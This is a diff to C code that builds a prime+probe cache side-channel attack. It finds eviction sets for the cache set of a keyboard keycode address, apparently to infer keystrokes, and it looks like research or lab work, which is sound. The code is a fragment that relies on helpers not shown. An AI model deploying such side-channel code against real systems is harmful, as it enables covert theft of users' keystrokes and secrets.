@@ -1,4 +1,5 @@
 #include <fcntl.h>
+#include <sched.h>
 #include <signal.h>
 #include <stdint.h>
 #include <stdio.h>
@@ -18,7 +19,15 @@
 #define WAIT_INTERVAL 10000
 
 void *mapping_start;
+EvictionSet *es;
+NumList *nl;
+unsigned int core_id = 0;
 
+void cleanup(EvictionSet *es, NumList *nl, void *mapping_start) {
+  deep_free_es(es);
+  free_num_list(nl);
+  munmap(mapping_start, EVERGLADES_LLC_SIZE << 4);
+}
 void handle_sigint(int sig) { munmap(mapping_start, EVERGLADES_LLC_SIZE << 4); }
 void test_eviction_set(void) {
   uint8_t victim = 0x37;
@@ -226,9 +235,30 @@ void measure_access(void) {
   munmap(mapping_start, EVERGLADES_LLC_SIZE << 4);
 }
 
+void prime_probe_once(EvictionSet *es, NumList *nl) {
+  access_set(es);
+  int start = __rdtscp(&core_id);
+  while (__rdtscp(&core_id) - start < WAIT_INTERVAL)
+    sched_yield();
+  probe(es, nl);
+}
+
 int main() {
   // test_eviction_set();
   // test_covert_channel();
   // test_eviction_and_pp();
-  // test_find_all_eviction_sets(set);
+  int set = pa_to_set(KBD_KEYCODE_ADDR, EVERGLADES);
+  test_find_all_eviction_sets(set);
+  // mapping_start = mmap(NULL, EVERGLADES_LLC_SIZE << 4, PROT_READ,
+  //                      MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0);
+  // if (mapping_start == MAP_FAILED) {
+  //   perror("map");
+  //   return 0;
+  // }
+  // printf("mmap: %p\n", (void *)mapping_start);
+  //
+  // es = find_kbd_keycode_es();
+  //
+  // nl = new_num_list(16);
+  // cleanup(es, nl, mapping_start);
 }
